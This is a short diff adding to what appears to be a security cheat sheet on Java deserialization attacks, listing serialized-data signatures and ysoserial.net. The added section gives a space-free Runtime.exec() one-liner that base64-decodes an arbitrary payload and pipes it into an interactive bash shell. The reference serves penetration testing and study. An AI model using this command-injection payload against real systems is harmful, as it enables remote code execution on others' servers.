@@ -419,6 +419,12 @@ https://github.com/pwntester/ysoserial.net
 -> binary with ac ed 00 05
 
 -> base64 starts with rO0AB in web applications
+  
+#### java.lang.Runtime.exec()
+  
+bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}
+
+https://www.bugku.net/runtime-exec-payloads/
 
 ### Tools
 
